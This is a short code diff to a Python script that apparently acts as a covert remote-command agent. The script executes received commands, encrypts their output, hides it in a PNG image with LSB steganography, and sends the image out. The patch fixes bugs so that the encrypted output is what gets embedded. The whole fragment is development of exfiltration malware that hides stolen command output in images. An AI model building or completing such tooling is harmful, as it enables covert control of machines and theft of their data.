@@ -37,7 +37,7 @@ def decrypt(ciphertext):
 def mod_img(msg):
     path = "./images/"
     file_name = "safari-bird"
-    encoded_img = lsb.hide(f"{path}{file_name}.png", msg) #we have to assume that we are in a writeable directory for this 
+    encoded_img = lsb.hide(f"{path}{file_name}.png", msg.decode("latin-1")) #we have to assume that we are in a writeable directory for this 
     encoded_img.save(f"{path}{file_name}-final.png")
     #Error Checking: 
     print("[*] Revealed from image:")
@@ -117,7 +117,7 @@ if __name__ == '__main__':
             output = exec(cmd) 
             if output != "": 
                 msg = encrypt(output)
-                obf_img = mod_img(output)
+                obf_img = mod_img(msg)
                 send_output(obf_img)
         except Exception as e: 
             print(e)
